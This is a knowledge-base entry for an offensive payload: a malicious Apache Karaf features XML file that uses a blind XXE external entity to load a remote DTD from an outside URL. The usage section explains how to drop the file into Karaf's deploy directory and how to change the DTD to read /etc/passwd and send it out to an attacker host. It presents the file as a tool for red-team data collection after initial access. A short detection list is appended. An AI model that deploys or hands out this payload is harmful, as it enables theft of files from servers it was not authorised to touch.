---
id: 292ff80f-ab36-400c-b293-bec4ec48bee6
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.442434+00:00'
updated_at: '2023-04-10T20:24:44.664030+00:00'
platforms:
  - Java
  - Linux
tags:
  - xxe
  - oob-exfil
  - payload
validated: true
---

# karaf-features-xxe-oob-payload

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

## Description

This XML code is a malicious Karaf features file designed to exploit blind XXE vulnerabilities during deployment. The DOCTYPE declares an external parameter entity (%dtd) that fetches a remote DTD from the specified URL. When processed by Karaf's XML parser, it resolves the entity, allowing the DTD to define further entities for exfiltrating local files (e.g., via HTTP requests to the attacker's server). Purpose: Enable out-of-band data theft without direct interaction, ideal for blind scenarios.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com` | URL hosting the malicious DTD for exfil | `http://your-dtd-server.com/evil.dtd` |
| `my-features` | Name of the features bundle (arbitrary) | `exfil-features` |
| `deployer` | Feature name to mimic legitimate deployment | `wrapper` |

## Usage

Save as 'malicious-features.xml' and upload to Karaf's /deploy/ directory or deploy via console. Karaf auto-processes on placement or restart, triggering the XXE. Customize the DTD at the URL to target files like `<!ENTITY % file SYSTEM "file:///etc/passwd">` and exfil via `<!ENTITY % eval "<%file;">`. Used in red team ops for internal data collection after initial access.

## Detection

- XML parsing logs in Karaf (grep 'DOCTYPE' or external URL in data/log/karaf.log).
- Outbound HTTP to unusual domains from Java processes (network monitoring).
- File system changes in /deploy/ with suspicious .xml (integrity checks).
- WAF/IDS signatures for XXE patterns like 'SYSTEM' or external entities.

## Related

- [[procedures/Apache-Karaf-XXE-Out-of-Band-Data-Exfiltration]]
- [[commands/create-karaf-xxe-xml-payload]]
